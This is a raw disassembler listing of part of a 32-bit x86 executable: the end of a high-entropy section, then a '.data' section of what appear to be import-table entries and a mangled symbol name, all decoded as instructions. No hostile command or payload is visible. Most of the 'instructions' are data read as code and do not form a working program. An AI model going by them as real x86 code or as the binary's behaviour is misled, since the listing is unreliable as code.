  41cd09:	jge    0x41cd6f
  41cd0b:	adc    DWORD PTR [eax+esi*1-0x31],esp
  41cd0f:	mov    esp,0xea1b5df4
  41cd14:	or     al,0x9c
  41cd16:	xor    bl,ch
  41cd18:	fmul   QWORD PTR [ebp+0x52a06a07]
  41cd1e:	test   DWORD PTR [edx+edi*2],ebp
  41cd21:	xchg   ecx,eax
  41cd22:	push   ds
  41cd23:	es dec ebp
  41cd25:	mov    esi,0xb220e708
  41cd2a:	mov    dl,0x8a
  41cd2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd2d:	mov    dl,0x78
  41cd2f:	fdivrp st(1),st
  41cd31:	addr16 out 0xf0,eax
  41cd34:	call   0x3fe5:0xbf338865
  41cd3b:	loop   0x41ccdc
  41cd3d:	pop    ss
  41cd3e:	rcl    BYTE PTR [ebx-0x3abb5bbb],1
  41cd44:	fst    DWORD PTR [ebp+0x13]
  41cd47:	or     al,0x41
  41cd49:	mov    ecx,ecx
  41cd4b:	cmp    ecx,DWORD PTR [edi+0x76]
  41cd4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd4f:	cmp    eax,0x9f1752f6
  41cd54:	fnstenv [eax-0x6]
  41cd57:	jp     0x41cd25
  41cd59:	loope  0x41ccef
  41cd5b:	pop    es
  41cd5c:	and    eax,0xd0861d9c
  41cd61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd62:	(bad)  
  41cd63:	lods   eax,DWORD PTR ds:[esi]
  41cd64:	lahf   
  41cd65:	xchg   esp,eax
  41cd66:	mov    dh,BYTE PTR [edi-0x3d36a4f0]
  41cd6c:	adc    BYTE PTR [eax],al

Disassembly of section .data:

0041d000 <.data>:
  41d000:	sbb    cl,bl
  41d002:	add    DWORD PTR [eax],eax
  41d004:	fld    DWORD PTR es:[ecx]
  41d007:	add    BYTE PTR [eax],dh
  41d009:	fld    DWORD PTR [ecx]
  41d00b:	add    BYTE PTR [edx],bh
  41d00d:	fld    DWORD PTR [ecx]
  41d00f:	add    BYTE PTR [edx-0x27],al
  41d012:	add    DWORD PTR [eax],eax
  41d014:	dec    esp
  41d015:	fld    DWORD PTR [ecx]
  41d017:	add    BYTE PTR [eax-0x27],bl
  41d01a:	add    DWORD PTR [eax],eax
  41d01c:	(bad)  
  41d01d:	fld    DWORD PTR [ecx]
  41d01f:	add    BYTE PTR [ecx+ebx*8+0x1],ch
  41d023:	add    BYTE PTR [eax-0x27],bh
  41d026:	add    DWORD PTR [eax],eax
  41d028:	sbb    cl,0x1
  41d02b:	add    BYTE PTR [eax-0x65fffe27],cl
  41d031:	fld    DWORD PTR [ecx]
  41d033:	add    BYTE PTR [eax-0x4dfffe27],ch
  41d039:	fld    DWORD PTR [ecx]
  41d03b:	add    BYTE PTR [ecx+ebx*8-0x2639ffff],bh
  41d042:	add    DWORD PTR [eax],eax
  41d044:	rcr    cl,1
  41d046:	add    DWORD PTR [eax],eax
  41d048:	loopne 0x41d023
  41d04a:	add    DWORD PTR [eax],eax
  41d04c:	jmp    0x1d9:0xf80001d9
  41d053:	add    BYTE PTR [edx+ebx*8],al
  41d056:	add    DWORD PTR [eax],eax
  41d058:	push   cs
  41d059:	fiadd  DWORD PTR [ecx]
  41d05b:	add    BYTE PTR [edx],bl
  41d05d:	fiadd  DWORD PTR [ecx]
  41d05f:	add    BYTE PTR [edx+ebx*8],ah
  41d062:	add    DWORD PTR [eax],eax
  41d064:	fiadd  DWORD PTR cs:[ecx]
  41d067:	add    BYTE PTR [eax],bh
  41d069:	fiadd  DWORD PTR [ecx]
  41d06b:	add    BYTE PTR [eax-0x26],al
  41d06e:	add    DWORD PTR [eax],eax
  41d070:	dec    esi
  41d071:	fiadd  DWORD PTR [ecx]
  41d073:	add    BYTE PTR [eax-0x26],bl
  41d076:	add    DWORD PTR [eax],eax
  41d078:	fiadd  DWORD PTR fs:[ecx]
  41d07b:	add    BYTE PTR [esi-0x26],ch
  41d07e:	add    DWORD PTR [eax],eax
  41d080:	js     0x41d05c
  41d082:	add    DWORD PTR [eax],eax
  41d084:	xchg   dl,bl
  41d086:	add    DWORD PTR [eax],eax
  41d088:	mov    ds,edx
  41d08a:	add    DWORD PTR [eax],eax
  41d08c:	call   0x1da:0xa40001da
  41d093:	add    BYTE PTR [esi-0x47fffe26],ch
  41d099:	fiadd  DWORD PTR [ecx]
  41d09b:	add    ah,cl
  41d09d:	fiadd  DWORD PTR [ecx]
  41d09f:	add    ah,bl
  41d0a1:	fiadd  DWORD PTR [ecx]
  41d0a3:	add    al,ch
  41d0a5:	fiadd  DWORD PTR [ecx]
  41d0a7:	add    dl,dh
  41d0a9:	fiadd  DWORD PTR [ecx]
  41d0ab:	add    ah,bh
  41d0ad:	fiadd  DWORD PTR [ecx]
  41d0af:	add    BYTE PTR [eax],al
  41d0b1:	add    BYTE PTR [eax],al
  41d0b3:	add    BYTE PTR [edx],dl
  41d0b5:	fild   DWORD PTR [ecx]
  41d0b7:	add    BYTE PTR [eax],dh
  41d0b9:	fild   DWORD PTR [ecx]
  41d0bb:	add    BYTE PTR [eax-0x25],cl
  41d0be:	add    DWORD PTR [eax],eax
  41d0c0:	push   0x7a0001db
  41d0c5:	fild   DWORD PTR [ecx]
  41d0c7:	add    BYTE PTR [edx-0x57fffe25],cl
  41d0cd:	fild   DWORD PTR [ecx]
  41d0cf:	add    dl,al
  41d0d1:	fild   DWORD PTR [ecx]
  41d0d3:	add    dh,dl
  41d0d5:	fild   DWORD PTR [ecx]
  41d0d7:	add    dh,ah
  41d0d9:	fild   DWORD PTR [ecx]
  41d0db:	add    BYTE PTR [edx],al
  41d0dd:	fadd   QWORD PTR [ecx]
  41d0df:	add    BYTE PTR [esp+ebx*8],bl
  41d0e2:	add    DWORD PTR [eax],eax
  41d0e4:	sub    al,0xdc
  41d0e6:	add    DWORD PTR [eax],eax
  41d0e8:	cmp    bl,ah
  41d0ea:	add    DWORD PTR [eax],eax
  41d0ec:	dec    esi
  41d0ed:	fadd   QWORD PTR [ecx]
  41d0ef:	add    BYTE PTR [edx-0x24],bl
  41d0f2:	add    DWORD PTR [eax],eax
  41d0f4:	data16 fadd QWORD PTR [ecx]
  41d0f7:	add    BYTE PTR [eax-0x24],bh
  41d0fa:	add    DWORD PTR [eax],eax
  41d0fc:	mov    bl,ah
  41d0fe:	add    DWORD PTR [eax],eax
  41d100:	pushf  
  41d101:	fadd   QWORD PTR [ecx]
  41d103:	add    BYTE PTR [esi-0x3ffffe24],ch
  41d109:	fadd   QWORD PTR [ecx]
  41d10b:	add    ah,cl
  41d10d:	fadd   QWORD PTR [ecx]
  41d10f:	add    al,ah
  41d111:	fadd   QWORD PTR [ecx]
  41d113:	add    ah,dh
  41d115:	fadd   QWORD PTR [ecx]
  41d117:	add    BYTE PTR [esi],al
  41d119:	fld    QWORD PTR [ecx]
  41d11b:	add    BYTE PTR [esi],dl
  41d11d:	fld    QWORD PTR [ecx]
  41d11f:	add    BYTE PTR [ebx*8-0x22c3ffff],ah
  41d126:	add    DWORD PTR [eax],eax
  41d128:	dec    edx
  41d129:	fld    QWORD PTR [ecx]
  41d12b:	add    BYTE PTR [eax-0x23],bl
  41d12e:	add    DWORD PTR [eax],eax
  41d130:	pusha  
  41d131:	fld    QWORD PTR [ecx]
  41d133:	add    BYTE PTR [esi-0x23],ch
  41d136:	add    DWORD PTR [eax],eax
  41d138:	test   ch,bl
  41d13a:	add    DWORD PTR [eax],eax
  41d13c:	mov    ds,ebp
  41d13e:	add    DWORD PTR [eax],eax
  41d140:	sahf   
  41d141:	fld    QWORD PTR [ecx]
  41d143:	add    BYTE PTR [ebp+ebx*8-0x2239ffff],dh
  41d14a:	add    DWORD PTR [eax],eax
  41d14c:	fcmovu st,st(5)
  41d14e:	add    DWORD PTR [eax],eax
  41d150:	out    dx,al
  41d151:	fld    QWORD PTR [ecx]
  41d153:	add    ah,bh
  41d155:	fld    QWORD PTR [ecx]
  41d157:	add    BYTE PTR [eax],cl
  41d159:	fiadd  WORD PTR [ecx]
  41d15b:	add    BYTE PTR [eax],ah
  41d15d:	fiadd  WORD PTR [ecx]
  41d15f:	add    BYTE PTR [edx],dh
  41d161:	fiadd  WORD PTR [ecx]
  41d163:	add    BYTE PTR [edx-0x22],cl
  41d166:	add    DWORD PTR [eax],eax
  41d168:	pop    esp
  41d169:	fiadd  WORD PTR [ecx]
  41d16b:	add    BYTE PTR [esi+ebx*8+0x1],dh
  41d16f:	add    BYTE PTR [edx-0x71fffe22],al
  41d175:	fiadd  WORD PTR [ecx]
  41d177:	add    BYTE PTR [edx+0x1de],ah
  41d17d:	add    BYTE PTR [eax],al
  41d17f:	add    al,al
  41d181:	fiadd  WORD PTR [ecx]
  41d183:	add    dl,cl
  41d185:	fiadd  WORD PTR [ecx]
  41d187:	add    ah,dl
  41d189:	fiadd  WORD PTR [ecx]
  41d18b:	add    al,ah
  41d18d:	fiadd  WORD PTR [ecx]
  41d18f:	add    ah,dh
  41d191:	fiadd  WORD PTR [ecx]
  41d193:	add    BYTE PTR [eax],al
  41d195:	fild   WORD PTR [ecx]
  41d197:	add    BYTE PTR [edx],bl
  41d199:	fild   WORD PTR [ecx]
  41d19b:	add    BYTE PTR [edx],ch
  41d19d:	fild   WORD PTR [ecx]
  41d19f:	add    BYTE PTR [eax],bh
  41d1a1:	fild   WORD PTR [ecx]
  41d1a3:	add    BYTE PTR [eax-0x21],dl
  41d1a6:	add    DWORD PTR [eax],eax
  41d1a8:	fild   WORD PTR fs:[ecx]
  41d1ab:	add    BYTE PTR [esi-0x21],bh
  41d1ae:	add    DWORD PTR [eax],eax
  41d1b0:	mov    edi,ds
  41d1b2:	add    DWORD PTR [eax],eax
  41d1b4:	cwde   
  41d1b5:	fild   WORD PTR [ecx]
  41d1b7:	add    BYTE PTR [esi-0x45fffe21],ah
  41d1bd:	fild   WORD PTR [ecx]
  41d1bf:	add    dh,al
  41d1c1:	fild   WORD PTR [ecx]
  41d1c3:	add    dh,dl
  41d1c5:	fild   WORD PTR [ecx]
  41d1c7:	add    dh,ah
  41d1c9:	fild   WORD PTR [ecx]
  41d1cb:	add    ah,bh
  41d1cd:	fild   WORD PTR [ecx]
  41d1cf:	add    BYTE PTR [eax],cl
  41d1d1:	loopne 0x41d1d4
  41d1d3:	add    BYTE PTR [eax+eiz*8],dl
  41d1d6:	add    DWORD PTR [eax],eax
  41d1d8:	sub    al,ah
  41d1da:	add    DWORD PTR [eax],eax
  41d1dc:	ds loopne 0x41d1e0
  41d1df:	add    BYTE PTR [esi-0x20],dl
  41d1e2:	add    DWORD PTR [eax],eax
  41d1e4:	data16 loopne 0x41d1e8
  41d1e7:	add    BYTE PTR [edx-0x20],dh
  41d1ea:	add    DWORD PTR [eax],eax
  41d1ec:	xchg   al,ah
  41d1ee:	add    DWORD PTR [eax],eax
  41d1f0:	xchg   esp,eax
  41d1f1:	loopne 0x41d1f4
  41d1f3:	add    BYTE PTR [esi-0x47fffe20],ch
  41d1f9:	loopne 0x41d1fc
  41d1fb:	add    dl,cl
  41d1fd:	loopne 0x41d200
  41d1ff:	add    ah,bl
  41d201:	loopne 0x41d204
  41d203:	add    dh,ch
  41d205:	loopne 0x41d208
  41d207:	add    dh,bh
  41d209:	loopne 0x41d20c
  41d20b:	add    BYTE PTR [eax],cl
  41d20d:	loope  0x41d210
  41d20f:	add    BYTE PTR [esi],bl
  41d211:	loope  0x41d214
  41d213:	add    BYTE PTR [edx],dh
  41d215:	loope  0x41d218
  41d217:	add    BYTE PTR [esi-0x1f],al
  41d21a:	add    DWORD PTR [eax],eax
  41d21c:	push   esi
  41d21d:	loope  0x41d220
  41d21f:	add    BYTE PTR [esi-0x1f],ah
  41d222:	add    DWORD PTR [eax],eax
  41d224:	jb     0x41d207
  41d226:	add    DWORD PTR [eax],eax
  41d228:	test   cl,ah
  41d22a:	add    DWORD PTR [eax],eax
  41d22c:	mov    al,ds:0xb60001e1
  41d231:	loope  0x41d234
  41d233:	add    dl,al
  41d235:	loope  0x41d238
  41d237:	add    dh,dl
  41d239:	loope  0x41d23c
  41d23b:	add    BYTE PTR [eax],al
  41d23d:	add    BYTE PTR [eax],al
  41d23f:	add    ah,dh
  41d241:	loope  0x41d244
  41d243:	add    BYTE PTR [edx+eiz*8],al
  41d246:	add    DWORD PTR [eax],eax
  41d248:	adc    al,0xe2
  41d24a:	add    DWORD PTR [eax],eax
  41d24c:	and    ah,dl
  41d24e:	add    DWORD PTR [eax],eax
  41d250:	xor    dl,ah
  41d252:	add    DWORD PTR [eax],eax
  41d254:	ds loop 0x41d258
  41d257:	add    BYTE PTR [edx-0x1e],dl
  41d25a:	add    DWORD PTR [eax],eax
  41d25c:	pusha  
  41d25d:	loop   0x41d260
  41d25f:	add    BYTE PTR [edx-0x1e],bh
  41d262:	add    DWORD PTR [eax],eax
  41d264:	xchg   dl,ah
  41d266:	add    DWORD PTR [eax],eax
  41d268:	cwde   
  41d269:	loop   0x41d26c
  41d26b:	add    BYTE PTR [edx+eiz*8-0x1d47ffff],ah
  41d272:	add    DWORD PTR [eax],eax
  41d274:	int3   
  41d275:	loop   0x41d278
  41d277:	add    dh,dl
  41d279:	loop   0x41d27c
  41d27b:	add    al,ah
  41d27d:	loop   0x41d280
  41d27f:	add    dl,bh
  41d281:	loop   0x41d284
  41d283:	add    BYTE PTR [edx],cl
  41d285:	jecxz  0x41d288
  41d287:	add    BYTE PTR [edx],bl
  41d289:	jecxz  0x41d28c
  41d28b:	add    BYTE PTR [ebx+eiz*8],ah
  41d28e:	add    DWORD PTR [eax],eax
  41d290:	xor    al,0xe3
  41d292:	add    DWORD PTR [eax],eax
  41d294:	inc    eax
  41d295:	jecxz  0x41d298
  41d297:	add    BYTE PTR [esi-0x1d],cl
  41d29a:	add    DWORD PTR [eax],eax
  41d29c:	fs jecxz 0x41d2a0
  41d29f:	add    BYTE PTR [esi-0x1d],dh
  41d2a2:	add    DWORD PTR [eax],eax
  41d2a4:	mov    fs,ebx
  41d2a6:	add    DWORD PTR [eax],eax
  41d2a8:	mov    ds:0xb00001e3,al
  41d2ad:	jecxz  0x41d2b0
  41d2af:	add    dl,al
  41d2b1:	jecxz  0x41d2b4
  41d2b3:	add    dh,cl
  41d2b5:	jecxz  0x41d2b8
  41d2b7:	add    dh,bl
  41d2b9:	jecxz  0x41d2bc
  41d2bb:	add    ah,ch
  41d2bd:	jecxz  0x41d2c0
  41d2bf:	add    BYTE PTR [eax],al
  41d2c1:	in     al,0x1
  41d2c3:	add    BYTE PTR [esi],cl
  41d2c5:	in     al,0x1
  41d2c7:	add    BYTE PTR [edx],ch
  41d2c9:	in     al,0x1
  41d2cb:	add    BYTE PTR [esp+eiz*8],bh
  41d2ce:	add    DWORD PTR [eax],eax
  41d2d0:	dec    esp
  41d2d1:	in     al,0x1
  41d2d3:	add    BYTE PTR [esi-0x1c],bl
  41d2d6:	add    DWORD PTR [eax],eax
  41d2d8:	push   0xffffffe4
  41d2da:	add    DWORD PTR [eax],eax
  41d2dc:	jl     0x41d2c2
  41d2de:	add    DWORD PTR [eax],eax
  41d2e0:	mov    ah,ah
  41d2e2:	add    DWORD PTR [eax],eax
  41d2e4:	cwde   
  41d2e5:	in     al,0x1
  41d2e7:	add    BYTE PTR [esi-0x3ffffe1c],ch
  41d2ed:	in     al,0x1
  41d2ef:	add    al,dl
  41d2f1:	in     al,0x1
  41d2f3:	add    dl,ah
  41d2f5:	in     al,0x1
  41d2f7:	add    al,dh
  41d2f9:	in     al,0x1
  41d2fb:	add    BYTE PTR [eax],cl
  41d2fd:	in     eax,0x1
  41d2ff:	add    BYTE PTR [eiz*8-0x1ad5ffff],bl
  41d306:	add    DWORD PTR [eax],eax
  41d308:	ds in  eax,0x1
  41d30b:	add    BYTE PTR [edx-0x1b],cl
  41d30e:	add    DWORD PTR [eax],eax
  41d310:	pop    edx
  41d311:	in     eax,0x1
  41d313:	add    BYTE PTR [esi-0x1b],ch
  41d316:	add    DWORD PTR [eax],eax
  41d318:	jle    0x41d2ff
  41d31a:	add    DWORD PTR [eax],eax
  41d31c:	nop
  41d31d:	in     eax,0x1
  41d31f:	add    BYTE PTR [ebp+eiz*8-0x1a55ffff],bl
  41d326:	add    DWORD PTR [eax],eax
  41d328:	mov    eax,0xca0001e5
  41d32d:	in     eax,0x1
  41d32f:	add    dl,bl
  41d331:	in     eax,0x1
  41d333:	add    dh,ah
  41d335:	in     eax,0x1
  41d337:	add    ah,bh
  41d339:	in     eax,0x1
  41d33b:	add    BYTE PTR [esi],cl
  41d33d:	out    0x1,al
  41d33f:	add    BYTE PTR [eax],ch
  41d341:	out    0x1,al
  41d343:	add    BYTE PTR [edx],bh
  41d345:	out    0x1,al
  41d347:	add    BYTE PTR [esi+eiz*8+0x1],cl
  41d34b:	add    BYTE PTR [eax-0x1a],bl
  41d34e:	add    DWORD PTR [eax],eax
  41d350:	push   0x7a0001e6
  41d355:	out    0x1,al
  41d357:	add    BYTE PTR [esi-0x67fffe1a],al
  41d35d:	out    0x1,al
  41d35f:	add    BYTE PTR [edx-0x35fffe1a],dh
  41d365:	out    0x1,al
  41d367:	add    ah,bl
  41d369:	out    0x1,al
  41d36b:	add    dl,ch
  41d36d:	out    0x1,al
  41d36f:	add    al,bh
  41d371:	out    0x1,al
  41d373:	add    BYTE PTR [esi],cl
  41d375:	out    0x1,eax
  41d377:	add    BYTE PTR [esi],bl
  41d379:	out    0x1,eax
  41d37b:	add    BYTE PTR [edx],ch
  41d37d:	out    0x1,eax
  41d37f:	add    BYTE PTR [edx],bh
  41d381:	out    0x1,eax
  41d383:	add    BYTE PTR [edx-0x19],cl
  41d386:	add    DWORD PTR [eax],eax
  41d388:	pop    esp
  41d389:	out    0x1,eax
  41d38b:	add    BYTE PTR [eax-0x19],ch
  41d38e:	add    DWORD PTR [eax],eax
  41d390:	jbe    0x41d379
  41d392:	add    DWORD PTR [eax],eax
  41d394:	xchg   bh,ah
  41d396:	add    DWORD PTR [eax],eax
  41d398:	cwde   
  41d399:	out    0x1,eax
  41d39b:	add    BYTE PTR [eax-0x45fffe19],ch
  41d3a1:	out    0x1,eax
  41d3a3:	add    al,dl
  41d3a5:	out    0x1,eax
  41d3a7:	add    dh,ah
  41d3a9:	out    0x1,eax
  41d3ab:	add    dh,dh
  41d3ad:	out    0x1,eax
  41d3af:	add    BYTE PTR [edx],al
  41d3b1:	call   0xe859d3b7
  41d3b6:	add    DWORD PTR [eax],eax
  41d3b8:	and    al,0xe8
  41d3ba:	add    DWORD PTR [eax],eax
  41d3bc:	xor    al,0xe8
  41d3be:	add    DWORD PTR [eax],eax
  41d3c0:	dec    eax
  41d3c1:	call   0xe897d3c7
  41d3c6:	add    DWORD PTR [eax],eax
  41d3c8:	callw  0xd3cd
  41d3cc:	jp     0x41d3b6
  41d3ce:	add    DWORD PTR [eax],eax
  41d3d0:	xchg   al,ch
  41d3d2:	add    DWORD PTR [eax],eax
  41d3d4:	xchg   esi,eax
  41d3d5:	call   0xe8e3d3db
  41d3da:	add    DWORD PTR [eax],eax
  41d3dc:	mov    dl,0xe8
  41d3de:	add    DWORD PTR [eax],eax
  41d3e0:	(bad)  
  41d3e1:	call   0xe913d3e7
  41d3e6:	add    DWORD PTR [eax],eax
  41d3e8:	in     al,0xe8
  41d3ea:	add    DWORD PTR [eax],eax
  41d3ec:	lock call 0xe93fd3f3
  41d3f2:	add    DWORD PTR [eax],eax
  41d3f4:	or     al,0xe9
  41d3f6:	add    DWORD PTR [eax],eax
  41d3f8:	sbb    ch,cl
  41d3fa:	add    DWORD PTR [eax],eax
  41d3fc:	add    BYTE PTR [eax],al
  41d3fe:	add    BYTE PTR [eax],al
  41d400:	or     al,0x2
  41d402:	add    BYTE PTR [eax+0x0],al
  41d408:	add    BYTE PTR [eax],al
  41d40a:	add    BYTE PTR [eax],al
  41d40c:	das    
  41d40d:	and    DWORD PTR [ecx*2+0x0],edx
  41d414:	add    al,BYTE PTR [eax]
  41d416:	add    BYTE PTR [eax],al
  41d418:	pop    ebp
  41d419:	add    BYTE PTR [eax],al
  41d41b:	add    BYTE PTR [ebx+ebp*4+0x2],dl
  41d41f:	add    BYTE PTR [ebp+ebx*4+0x2],dl
	...
  41d42b:	add    BYTE PTR [edi],ch
  41d42d:	and    DWORD PTR [ecx*2+0x0],edx
  41d434:	pop    edx
  41d435:	aam    0x1
  41d437:	add    BYTE PTR [ecx],al
  41d439:	add    BYTE PTR [eax],al
  41d43b:	add    BYTE PTR [ecx],al
  41d43d:	add    BYTE PTR [eax],al
  41d43f:	add    BYTE PTR [ecx],al
  41d441:	add    BYTE PTR [eax],al
  41d443:	add    BYTE PTR [eax-0x2c],dl
  41d446:	add    DWORD PTR [eax],eax
  41d448:	push   esp
  41d449:	aam    0x1
  41d44b:	add    BYTE PTR [eax-0x2c],bl
  41d44e:	add    DWORD PTR [eax],eax
  41d450:	xchg   edi,eax
  41d451:	inc    ebx
  41d452:	add    BYTE PTR [eax],al
  41d454:	imul   edx,esp,0x1
  41d457:	add    BYTE PTR [eax],al
  41d459:	add    BYTE PTR [eax+ebp*2+0x58],ah
  41d45d:	xor    dl,BYTE PTR [eax+0x78]
  41d460:	jp     0x41d4aa
  41d462:	jp     0x41d4d5
  41d464:	outs   dx,BYTE PTR ds:[esi]
  41d465:	je     0x41d495
  41d467:	je     0x41d4d2
  41d469:	jo     0x41d46b
  41d46b:	aas    
  41d46c:	dec    eax
  41d46d:	imul   esp,DWORD PTR [ebp+eiz*2+0x50],0x746e696f
  41d475:	gs jb  0x41d4c7
  41d478:	jb     0x41d4e3
  41d47a:	imul   ebp,DWORD PTR [bp+0x61],0x5940406c
  41d482:	inc    edi
  41d483:	inc    esi
  41d484:	dec    ebx
  41d485:	push   eax
  41d486:	inc    ecx
  41d487:	dec    ecx
  41d488:	push   eax
  41d489:	inc    ecx
  41d48a:	inc    esp
  41d48b:	cmp    al,0x56
	...
  41d495:	add    BYTE PTR [eax],al
  41d497:	add    BYTE PTR [eax],dl
  41d499:	aad    0x1
	...
  41d4a3:	add    BYTE PTR [esi],al
  41d4a5:	fild   DWORD PTR [ecx]
  41d4a7:	add    BYTE PTR [eax],al
  41d4a9:	rol    BYTE PTR [ecx],1
  41d4ab:	add    ah,al
  41d4ad:	aad    0x1
	...
  41d4b7:	add    BYTE PTR [edx-0x4bfffe22],dh
  41d4bd:	rol    BYTE PTR [ecx],1
  41d4bf:	add    BYTE PTR [eax+0x1d6],dl
  41d4c5:	add    BYTE PTR [eax],al
  41d4c7:	add    BYTE PTR [eax],al
  41d4c9:	add    BYTE PTR [eax],al
  41d4cb:	add    dl,ch
  41d4cd:	loope  0x41d4d0
  41d4cf:	add    BYTE PTR [eax+0x500001d1],al
  41d4d5:	xlat   BYTE PTR ds:[ebx]
  41d4d6:	add    DWORD PTR [eax],eax
	...
  41d4e0:	ss jmp 0xd281d4e7
  41d4e6:	add    DWORD PTR [eax],eax
  41d4e8:	adc    cl,bl
  41d4ea:	add    DWORD PTR [eax],eax
	...
  41d4f4:	inc    edx
  41d4f5:	jmp    0xd441d4fb
  41d4fa:	add    DWORD PTR [eax],eax
	...
  41d510:	sbb    cl,bl
  41d512:	add    DWORD PTR [eax],eax
  41d514:	fld    DWORD PTR es:[ecx]
  41d517:	add    BYTE PTR [eax],dh
  41d519:	fld    DWORD PTR [ecx]
  41d51b:	add    BYTE PTR [edx],bh
  41d51d:	fld    DWORD PTR [ecx]
  41d51f:	add    BYTE PTR [edx-0x27],al
  41d522:	add    DWORD PTR [eax],eax
  41d524:	dec    esp
  41d525:	fld    DWORD PTR [ecx]
  41d527:	add    BYTE PTR [eax-0x27],bl
  41d52a:	add    DWORD PTR [eax],eax
  41d52c:	(bad)  
  41d52d:	fld    DWORD PTR [ecx]
  41d52f:	add    BYTE PTR [ecx+ebx*8+0x1],ch
  41d533:	add    BYTE PTR [eax-0x27],bh
  41d536:	add    DWORD PTR [eax],eax
  41d538:	sbb    cl,0x1
  41d53b:	add    BYTE PTR [eax-0x65fffe27],cl
  41d541:	fld    DWORD PTR [ecx]
  41d543:	add    BYTE PTR [eax-0x4dfffe27],ch
  41d549:	fld    DWORD PTR [ecx]
  41d54b:	add    BYTE PTR [ecx+ebx*8-0x2639ffff],bh
  41d552:	add    DWORD PTR [eax],eax
  41d554:	rcr    cl,1
  41d556:	add    DWORD PTR [eax],eax
  41d558:	loopne 0x41d533
  41d55a:	add    DWORD PTR [eax],eax
  41d55c:	jmp    0x1d9:0xf80001d9
  41d563:	add    BYTE PTR [edx+ebx*8],al
  41d566:	add    DWORD PTR [eax],eax
  41d568:	push   cs
  41d569:	fiadd  DWORD PTR [ecx]
  41d56b:	add    BYTE PTR [edx],bl
  41d56d:	fiadd  DWORD PTR [ecx]
  41d56f:	add    BYTE PTR [edx+ebx*8],ah
  41d572:	add    DWORD PTR [eax],eax
  41d574:	fiadd  DWORD PTR cs:[ecx]
  41d577:	add    BYTE PTR [eax],bh
  41d579:	fiadd  DWORD PTR [ecx]
  41d57b:	add    BYTE PTR [eax-0x26],al
  41d57e:	add    DWORD PTR [eax],eax
  41d580:	dec    esi
  41d581:	fiadd  DWORD PTR [ecx]
  41d583:	add    BYTE PTR [eax-0x26],bl
  41d586:	add    DWORD PTR [eax],eax
  41d588:	fiadd  DWORD PTR fs:[ecx]
  41d58b:	add    BYTE PTR [esi-0x26],ch
  41d58e:	add    DWORD PTR [eax],eax
  41d590:	js     0x41d56c
  41d592:	add    DWORD PTR [eax],eax
  41d594:	xchg   dl,bl
  41d596:	add    DWORD PTR [eax],eax
  41d598:	mov    ds,edx
  41d59a:	add    DWORD PTR [eax],eax
  41d59c:	call   0x1da:0xa40001da
  41d5a3:	add    BYTE PTR [esi-0x47fffe26],ch
  41d5a9:	fiadd  DWORD PTR [ecx]
  41d5ab:	add    ah,cl
  41d5ad:	fiadd  DWORD PTR [ecx]
  41d5af:	add    ah,bl
  41d5b1:	fiadd  DWORD PTR [ecx]
  41d5b3:	add    al,ch
  41d5b5:	fiadd  DWORD PTR [ecx]
  41d5b7:	add    dl,dh
  41d5b9:	fiadd  DWORD PTR [ecx]
  41d5bb:	add    ah,bh
  41d5bd:	fiadd  DWORD PTR [ecx]
  41d5bf:	add    BYTE PTR [eax],al
  41d5c1:	add    BYTE PTR [eax],al
  41d5c3:	add    BYTE PTR [edx],dl
  41d5c5:	fild   DWORD PTR [ecx]
  41d5c7:	add    BYTE PTR [eax],dh
  41d5c9:	fild   DWORD PTR [ecx]
  41d5cb:	add    BYTE PTR [eax-0x25],cl
  41d5ce:	add    DWORD PTR [eax],eax
  41d5d0:	push   0x7a0001db
  41d5d5:	fild   DWORD PTR [ecx]
  41d5d7:	add    BYTE PTR [edx-0x57fffe25],cl
  41d5dd:	fild   DWORD PTR [ecx]
  41d5df:	add    dl,al
  41d5e1:	fild   DWORD PTR [ecx]
  41d5e3:	add    dh,dl
  41d5e5:	fild   DWORD PTR [ecx]
  41d5e7:	add    dh,ah
  41d5e9:	fild   DWORD PTR [ecx]
  41d5eb:	add    BYTE PTR [edx],al
  41d5ed:	fadd   QWORD PTR [ecx]
  41d5ef:	add    BYTE PTR [esp+ebx*8],bl
  41d5f2:	add    DWORD PTR [eax],eax
  41d5f4:	sub    al,0xdc
  41d5f6:	add    DWORD PTR [eax],eax
  41d5f8:	cmp    bl,ah
  41d5fa:	add    DWORD PTR [eax],eax
  41d5fc:	dec    esi
  41d5fd:	fadd   QWORD PTR [ecx]
  41d5ff:	add    BYTE PTR [edx-0x24],bl
  41d602:	add    DWORD PTR [eax],eax
  41d604:	data16 fadd QWORD PTR [ecx]
  41d607:	add    BYTE PTR [eax-0x24],bh
  41d60a:	add    DWORD PTR [eax],eax
  41d60c:	mov    bl,ah
  41d60e:	add    DWORD PTR [eax],eax
  41d610:	pushf  
  41d611:	fadd   QWORD PTR [ecx]
  41d613:	add    BYTE PTR [esi-0x3ffffe24],ch
  41d619:	fadd   QWORD PTR [ecx]
  41d61b:	add    ah,cl
  41d61d:	fadd   QWORD PTR [ecx]
  41d61f:	add    al,ah
  41d621:	fadd   QWORD PTR [ecx]
  41d623:	add    ah,dh
  41d625:	fadd   QWORD PTR [ecx]
  41d627:	add    BYTE PTR [esi],al
  41d629:	fld    QWORD PTR [ecx]
  41d62b:	add    BYTE PTR [esi],dl
  41d62d:	fld    QWORD PTR [ecx]
  41d62f:	add    BYTE PTR [ebx*8-0x22c3ffff],ah
  41d636:	add    DWORD PTR [eax],eax
  41d638:	dec    edx
  41d639:	fld    QWORD PTR [ecx]
  41d63b:	add    BYTE PTR [eax-0x23],bl
  41d63e:	add    DWORD PTR [eax],eax
  41d640:	pusha  
  41d641:	fld    QWORD PTR [ecx]
  41d643:	add    BYTE PTR [esi-0x23],ch
  41d646:	add    DWORD PTR [eax],eax
  41d648:	test   ch,bl
  41d64a:	add    DWORD PTR [eax],eax
  41d64c:	mov    ds,ebp
  41d64e:	add    DWORD PTR [eax],eax
  41d650:	sahf   
  41d651:	fld    QWORD PTR [ecx]
  41d653:	add    BYTE PTR [ebp+ebx*8-0x2239ffff],dh
  41d65a:	add    DWORD PTR [eax],eax
  41d65c:	fcmovu st,st(5)
  41d65e:	add    DWORD PTR [eax],eax
  41d660:	out    dx,al
  41d661:	fld    QWORD PTR [ecx]
  41d663:	add    ah,bh
  41d665:	fld    QWORD PTR [ecx]
  41d667:	add    BYTE PTR [eax],cl
  41d669:	fiadd  WORD PTR [ecx]
  41d66b:	add    BYTE PTR [eax],ah
  41d66d:	fiadd  WORD PTR [ecx]
  41d66f:	add    BYTE PTR [edx],dh
  41d671:	fiadd  WORD PTR [ecx]
  41d673:	add    BYTE PTR [edx-0x22],cl
